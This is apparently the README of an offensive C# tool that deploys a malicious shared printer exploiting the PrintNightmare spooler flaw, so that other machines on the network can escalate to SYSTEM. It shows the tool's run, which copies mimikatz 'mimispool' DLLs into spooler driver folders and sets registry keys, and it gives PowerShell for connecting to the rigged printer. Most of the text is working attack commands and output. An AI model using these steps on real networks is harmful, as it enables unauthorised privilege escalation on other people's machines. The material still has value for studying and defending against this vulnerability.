# DeployPrinterNightmare
C# tool for installing a shared network printer abusing the PrinterNightmare bug to allow other network machines easy privesc!

Discovered and demonstraited by the one and only [Benjamin Delpy](https://twitter.com/gentilkiwi)

```
C:\Users\Flangvik\Desktop>FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
[<3] @Flangvik - TrustedSec
[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Adding printer driver => Generic / Text Only!
[+] Adding printer => EasySystemShell!
[+] Setting 64-bit Registry key
[+] Setting 32-bit Registry key
[+] Setting '*' Registry key
```
You can then reach the EasySystemShell printer from the same network by hitting the computer it was installed on using explorer (Go to \\\\printer-installed-host\ in explorer, click the printer and install) or using PowerShell

```
$serverName  = 'printer-installed-host'
$printerName = 'EasySystemShell'
 
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
 
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

# Credits and ressources

*  @shreedee => https://github.com/shreedee/EVOPrinter/blob/master/printerDriver/SpoolerHelper.cs
*  [Benjamin Delpy](https://twitter.com/gentilkiwi) => https://twitter.com/gentilkiwi/status/1420896231648288772
* https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/
* https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex
* https://github.com/freefirex
